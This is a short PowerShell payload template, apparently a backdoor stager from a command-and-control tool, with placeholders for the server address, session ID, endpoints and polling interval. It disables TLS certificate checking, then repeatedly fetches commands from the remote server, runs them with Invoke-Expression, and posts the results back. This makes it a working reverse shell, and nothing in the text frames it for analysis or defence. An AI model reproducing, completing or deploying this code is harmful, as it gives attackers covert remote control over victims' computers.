add-type @"
using System.Net;using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
$s='*SERVERIP*';$i='*SESSIONID*';$p='https://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/*VERIFY* -Headers @{"X-Requested-With"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/*GETCMD* -Headers @{"X-Requested-With"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/*POSTRES* -Method POST -Headers @{"X-Requested-With"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($r+$e) -join ' ')} sleep *FREQ*}
